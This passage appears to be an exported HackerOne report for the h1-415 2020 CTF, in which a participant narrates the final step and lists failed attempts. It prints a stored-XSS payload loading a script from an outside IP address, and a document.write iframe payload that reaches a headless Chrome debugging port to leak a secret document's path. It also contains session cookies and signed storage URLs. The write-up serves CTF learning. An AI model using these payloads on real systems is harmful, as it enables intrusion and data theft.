session=eyJfY3NyZl90b2tlbiI6IjQ0YWVkMzVlZTEzZDFhZTE2YWFjMWY4YzZjYjcyM2EzM2E4MWQ5OTIifQ.XikxUg.RGSqXHt0tf83mgG5dCFTjzNe8ps\n\nname=\u0026lt;script src=\u0026#39;http://165.22.213.110/a1.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026amp;user_id=5\u0026amp;_csrf_token=44aed35ee13d1ae16aac1f8c6cb723a33a81d992\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe server resets every hour, creating a new user and getting the review location is a mess, so wrote a script which automates this \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"register.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ds6DGdVV9Z8hhzMH7Czx3yEp?response-content-disposition=attachment%3B%20filename%3D%22register.py%22%3B%20filename%2A%3DUTF-8%27%27register.py\u0026amp;response-content-type=text%2Fx-python\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065117Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=f2a5322063bcd5fe1b93d6c8951b1283734b8584349a206eaab2f506eeca5770\" data-attachment-type=\"text/x-python\"\u003eregister.py (F693607)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDay 6\u0026amp;7 Rabbit Holes every where\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eI literally failed solving this step and this is the final step of the CTF. These are things I  have tried\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003ePort scan with  aquatone\u0026#39;s and nmap\u0026#39;s most used http ports\u003ccode\u003ehttps://github.com/michenriksen/aquatone/blob/93c79694068733186878f50a545fa69f3dcec9ce/core/ports.go\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eTried to takeover \u003ccode\u003eadmin@mydocz.cosmic\u003c/code\u003e. We cant takeover this account from the client side, I tried recovering the account using the same technique  used for \u003ccode\u003eJobert\u0026#39;s\u003c/code\u003e account using XSS in pdf generator and BXSS. I failed at making the requests in localhost, you can see number of commits I did for this here \u003ca title=\"https://github.com/Invaders0/xss\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FInvaders0%2Fxss\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Invaders0/xss\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eChecked if there is any exploits are there for the Headless Chrome \u003cbr\u003e\n\u003ccode\u003eUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36\u003c/code\u003e. Failed\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eContent Discovery at \u003ca title=\"http://localhost/\" href=\"/redirect?url=http%3A%2F%2Flocalhost%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://localhost/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Failed\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eLot of other things etc.,\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eMeanwhile Hackerone released a hint\u003c/p\u003e\n\n\u003cp\u003e`üéÜ THE LAST HINT FOR THE #h1415 CTF: \u003c/p\u003e\n\n\u003cp\u003eHave you asked the CTF support bot for Jobert‚Äôs doc? \u003c/p\u003e\n\n\u003cp\u003eMaybe the user agent can tell you where to look next. üíÅ‚Äç‚ôÇÔ∏èüíÅ‚Äç‚ôÄÔ∏è\u003cbr\u003e\n`\u003c/p\u003e\n\n\u003cp\u003eAfter some time understanding the hint, I typed \u003ccode\u003eJobert\u0026#39;s Doc\u003c/code\u003e in the chat. It showed.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eI love flags! Where is yours? Wait... I think someone is converting top secret documents as we speak!\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eI am like WHAT THE HECK IS THIS?\u003c/p\u003e\n\n\u003cp\u003eIf we type \u003ccode\u003eflag\u003c/code\u003e or \u003ccode\u003eJobert\u0026#39;s Doc\u003c/code\u003e  in the chat, the conversion of secret doc is happening in the backend.\u003c/p\u003e\n\n\u003cp\u003eThen I tried looking at the localStorage, nothing found.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDay 8\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eLast 2 hours before the challenge\u003c/p\u003e\n\n\u003cp\u003eI am made my mind that I can\u0026#39;t solve this challenge.\u003c/p\u003e\n\n\u003cp\u003eBut I installed Node.js Headless chrome and generated some pdfs, in the github page \u003ca title=\"https://github.com/puppeteer/puppeteer\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpuppeteer%2Fpuppeteer\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/puppeteer/puppeteer\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e I found there is an option called debug. I tried searching for puppeteer debug port and the port is \u003ccode\u003e9222\u003c/code\u003e which is not in the aquatone\u0026#39;s list, seclist, nmap list. I am literally **********.\u003cbr\u003e\n I did port scanning in the first place but I didn\u0026#39;t do it properly. \u003c/p\u003e\n\n\u003cp\u003eThen I changed my username to \u003ccode\u003edocument.write(\u0026#39;\u0026lt;iframe src=\u0026quot;http://localhost:9222/\u0026quot; width=\u0026quot;100%\u0026quot; height=\u0026quot;200%\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;);\u003c/code\u003e this and something is running there its headless chrome debugging mode.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eStealing JOBERT\u0026#39;s DOC\u003c/strong\u003e*\u003c/p\u003e\n\n\u003cp\u003eDoing conversion with the below name\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\nwindow.onload =  function () {\n    document.write(\u0026#39;\u0026lt;iframe src=\u0026quot;http://localhost:9222/json/list\u0026quot; width=\u0026quot;100%\u0026quot; height=\u0026quot;100%\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;);\n};\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand entering \u003ccode\u003eflag\u003c/code\u003e in the chat. \u003c/p\u003e\n\n\u003cp\u003eResulted below data in the document.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\n, {\n \u0026quot;description\u0026quot;: \u0026quot;\u0026quot;,\n \u0026quot;devtoolsFrontendUrl\u0026quot;: \u0026quot;/devtools/inspector.html?\nws=localhost:9222/devtools/page/E07921059A405434488F22AB366D12DA\u0026quot;,\n \u0026quot;id\u0026quot;: \u0026quot;E07921059A405434488F22AB366D12DA\u0026quot;,\n \u0026quot;title\u0026quot;: \u0026quot;My Docz Converter\u0026quot;,\n \u0026quot;type\u0026quot;: \u0026quot;page\u0026quot;,\n \u0026quot;url\u0026quot;: \u0026quot;http://localhost:3000/login?\nsecret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\u0026quot;,\n \u0026quot;webSocketDebuggerUrl\u0026quot;: \u0026quot;ws://localhost:9222/devtools/page/E07921059A405434488F22AB366D12DA\u0026quot;\n}, {\n \u0026quot;description\u0026quot;: \u0026quot;\u0026quot;,\n \u0026quot;devtoolsFrontendUrl\u0026quot;: \u0026quot;/devtools/inspector.html?\nws=localhost:9222/devtools/page/8881164BAC5870CC4C2B2768FE47276C\u0026quot;,\n \u0026quot;id\u0026quot;: \u0026quot;8881164BAC5870CC4C2B2768FE47276C\u0026quot;,\n \u0026quot;title\u0026quot;: \u0026quot;about:blank\u0026quot;,\n \u0026quot;type\u0026quot;: \u0026quot;page\u0026quot;,\n \u0026quot;url\u0026quot;: \u0026quot;about:blank\u0026quot;,\n \u0026quot;webSocketDebuggerUrl\u0026quot;: \u0026quot;ws://localhost:9222/devtools/page/8881164BAC5870CC4C2B2768FE47276C\u0026quot;\n}, {\n \u0026quot;description\u0026quot;: \u0026quot;\u0026quot;,\n \u0026quot;devtoolsFrontendUrl\u0026quot;: \u0026quot;/devtools/inspector.html?\nws=localhost:9222/devtools/page/3758C9CE2153E8B69D7250E7FFF221C2\u0026quot;,\n \u0026quot;id\u0026quot;: \u0026quot;3758C9CE2153E8B69D7250E7FFF221C2\u0026quot;,\n \u0026quot;title\u0026quot;: \u0026quot;about:blank\u0026quot;,\n \u0026quot;type\u0026quot;: \u0026quot;page\u0026quot;,\n \u0026quot;url\u0026quot;: \u0026quot;about:blank\u0026quot;,\n \u0026quot;webSocketDebuggerUrl\u0026quot;: \u0026quot;ws://localhost:9222/devtools/page/3758C9CE2153E8B69D7250E7FFF221C2\u0026quot;\n}, {\n \u0026quot;description\u0026quot;: \u0026quot;\u0026quot;,\n \u0026quot;devtoolsFrontendUrl\u0026quot;: \u0026quot;/devtools/inspector.html?\nws=localhost:9222/devtools/page/49553C3E9C52C1F9A0C1228A6A5739FF\u0026quot;,\n \u0026quot;id\u0026quot;: \u0026quot;49553C3E9C52C1F9A0C1228A6A5739FF\u0026quot;,\n \u0026quot;title\u0026quot;: \u0026quot;about:blank\u0026quot;,\n \u0026quot;type\u0026quot;: \u0026quot;page\u0026quot;,\n \u0026quot;url\u0026quot;: \u0026quot;about:blank\u0026quot;,\n \u0026quot;webSocketDe\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd finally here is the flag\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://h1-415.h1ctf.com/documents/secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\" href=\"/redirect?url=https%3A%2F%2Fh1-415.h1ctf.com%2Fdocuments%2Fsecret_document%3D0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://h1-415.h1ctf.com/documents/secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\nh1ctf{y3s_1m_c0sm1c_n0w}\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHELL OF A RIDE\u003c/p\u003e\n\n\u003ch1 id=\"tryharder\"\u003eTRYHARDER\u003c/h1\u003e\n","automated_response":false,"created_at":"2020-01-23T07:58:52.197Z","updated_at":"2020-01-23T07:58:52.197Z","actor":{"username":"s1r1u5","cleared":true,"url":"/s1r1u5","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6NqjjWVeuBun4Voc9bJVpTSp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":693607,"filename":"register.py","type":"text/x-python","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ds6DGdVV9Z8hhzMH7Czx3yEp?response-content-disposition=attachment%3B%20filename%3D%22register.py%22%3B%20filename%2A%3DUTF-8%27%27register.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065117Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=f2a5322063bcd5fe1b93d6c8951b1283734b8584349a206eaab2f506eeca5770"},{"id":693604,"filename":"Screenshot_from_2020-01-23_13-23-26.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dQBpwzkVhGY1YvNDenWjQarU?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-01-23_13-23-26.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-01-23_13-23-26.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065117Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=5b54e3d64de7f8cfa31ff94aac9c55c8cf0572ce2744a7645cf66ef35d3d13a6"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6852653,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there,\n\nJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \n\nThanks! ","markdown_message":"\u003cp\u003eHey there,\u003c/p\u003e\n\n\u003cp\u003eJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \u003c/p\u003e\n\n\u003cp\u003eThanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T18:13:03.693Z","updated_at":"2020-01-23T18:13:03.693Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6934818,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Hackers! \n\nI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! ","markdown_message":"\u003cp\u003eHello Hackers! \u003c/p\u003e\n\n\u003cp\u003eI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T18:04:59.363Z","updated_at":"2020-01-31T18:04:59.363Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953827,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:32:39.357Z","updated_at":"2020-02-03T20:32:39.357Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"s1r1u5","url":"/s1r1u5"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953875,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:36:43.706Z","updated_at":"2020-02-03T20:36:43.706Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6955162,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-04T00:17:33.333Z","updated_at":"2020-02-04T00:17:33.333Z","actor":{"username":"s1r1u5","cleared":true,"url":"/s1r1u5","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6NqjjWVeuBun4Voc9bJVpTSp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6955163,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-04T00:17:33.380Z","updated_at":"2020-02-04T00:17:33.380Z","actor":{"username":"s1r1u5","cleared":true,"url":"/s1r1u5","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6NqjjWVeuBun4Voc9bJVpTSp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8236802,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-08T21:12:20.634Z","updated_at":"2020-06-08T21:12:20.634Z","additional_data":{"old_title":"Spent a week and failed at solving the last step.","new_title":"[h1-415 2020] Spent a week and failed at solving the last step."},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}